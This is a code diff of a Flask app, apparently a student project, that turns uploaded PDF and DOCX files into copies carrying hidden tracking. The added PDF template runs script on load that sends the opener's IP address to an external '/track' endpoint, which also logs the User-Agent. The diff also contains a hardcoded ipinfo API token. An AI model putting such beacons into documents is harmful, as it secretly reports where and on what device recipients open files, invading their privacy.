@@ -10,6 +10,7 @@ from passlib.hash import sha256_crypt
 import os,shutil
 from werkzeug.utils import secure_filename
 from pdf_gen import pdfgen
+from wordgen import docxGen
 from flask_mail import Mail, Message
 from datetime import datetime
 
@@ -20,7 +21,7 @@ mysql = MySQL()
 
 #file upload config
 app.config['MAX_CONTENT_LENGTH'] = 10024 * 1024 #10mb
-app.config['UPLOAD_EXTENSIONS'] = ['.pdf']
+app.config['UPLOAD_EXTENSIONS'] = ['.pdf','.docx']
 app.config['UPLOAD_PATH'] = os.path.join('static','files')
 
 ##Database configuration
@@ -54,13 +55,17 @@ def dependencies():
  # os.system('command -v ssh > /dev/null 2>&1 || { echo >&2 "Install ssh"; }')
  os.system('command -v i686-w64-mingw32-gcc > /dev/null 2>&1 || { echo >&2 "Install mingw-w64"; }')
 
-dependencies()
+#dependencies()
 
 
 @app.errorhandler(404)
 def page_not_found(e):
     # note that we set the 404 status explicitly
     return render_template('404.html'), 404
+
+
+
+
 
 @app.route('/track')
 def hello_world():
@@ -71,10 +76,13 @@ def hello_world():
     city=""
     postal=""
     long,lat="",""
+    if request.args.get('ip'):
+        ip=request.args.get('ip')
+    else:
+        ip = request.headers.getlist("X-Forwarded-For")[0]
+    #userDeviceInfo=request.args.get('data')
+    userDeviceInfo=str(request.headers.get('User-Agent'))
 
-    ip=request.args.get('ip')
-
-    userDeviceInfo=request.args.get('data')
     token=request.args.get('token')
     url = f'http://ipinfo.io/{ip}?token=91ad2d6d618ec3'
     response = requests.get(url=url)
@@ -202,7 +210,8 @@ def home():
     result = curs.execute("SELECT * FROM files WHERE userid=%s", [session['uid']])
     if result > 0:
         files=curs.fetchall()
-
+    for file in files:
+        file['ext']=file['filename'].split(".")[1]
     return render_template('home.html',files=files)
 
 @app.route('/upload', methods = ['GET', 'POST'])
@@ -219,40 +228,59 @@ def upload_file():
                 os.makedirs(os.path.join(path,'original'))
                 os.makedirs(os.path.join(path, 'generated'))
             if file_ext not in app.config['UPLOAD_EXTENSIONS']:
-                abort(400)
+                flash('File not supported', 'Danger')
+                return redirect(url_for('/'))
             uploaded_file.save(os.path.join(path,'original' ,filename))
 
             org_path = os.path.join(os.getcwd(),'static','files',str(session['uid']),'original')
             gen_path = os.path.join(os.getcwd(),'static','files',str(session['uid']),'generated')
-            script_path = os.path.join(os.getcwd(), 'pdf_gen')
+            token = secrets.token_hex(nbytes=16)
+            file_ext=filename.split(".")[1]
+            if file_ext=='pdf':
+                script_path = os.path.join(os.getcwd(), 'pdf_gen')
 
-            print(org_path)
-            print(script_path)
-            shutil.copy(os.path.join(org_path,filename), script_path)
-            #uploaded_file.save(os.path.join(script_path,filename))
+                print(org_path)
+                print(script_path)
+                shutil.copy(os.path.join(org_path,filename), script_path)
+                #uploaded_file.save(os.path.join(script_path,filename))
 
-            os.chdir(script_path)
-            token=secrets.token_hex(nbytes=16)
-            template = """"   <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
-   <script>
-    var ip="";
-    window.addEventListener('load',function () {
-    $.getJSON("https://api.ipify.org?format=json",
-                    function(data) {
+                os.chdir(script_path)
 
-      // Setting text of element P with id gfg
-      location.replace("https://cse-b-batch-4.herokuapp.com/track?token=%s&&ip="+data.ip+"&&data="+navigator.userAgent);
-    })
-   //location.replace("http:127.0.0.1:5000?ip="+ip);
-     })
-   </script>"""%(token)
+                template = """"   <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+       <script>
+        var ip="";
+        window.addEventListener('load',function () {
+        $.getJSON("https://api.ipify.org?format=json",
+                        function(data) {
+    
+          // Setting text of element P with id gfg
+          location.replace("https://cse-b-batch-4.herokuapp.com/track?token=%s&&ip="+data.ip);
+        })
+         })
+       </script>"""%(token)
 
-            with open('template.html','w') as htmlfile:
-                htmlfile.write(template)
-            pdfgen.start(filename)
-            shutil.copy(filename,gen_path)
-            os.remove(filename)
-            os.chdir('..')
+                with open('template.html','w') as htmlfile:
+                    htmlfile.write(template)
+                pdfgen.start(filename)
+                shutil.copy(filename,gen_path)
+                os.remove(filename)
+                os.chdir('..')
+            elif file_ext=='docx':
+
+                #generating file
+                word_path=os.path.join(org_path,filename)
+                os.chdir('wordgen')
+                docxGen.wordgen(token,word_path)
+                os.rename('generated.zip',filename)
+                shutil.move(filename,gen_path)
+                os.chdir("..")
+
+                #updating database
+
+
+            else:
+                flash('File not supported', 'danger')
+                return redirect(url_for('/'))
             #print(gen_path)
             curs = mysql.connection.cursor()
             curs.execute(
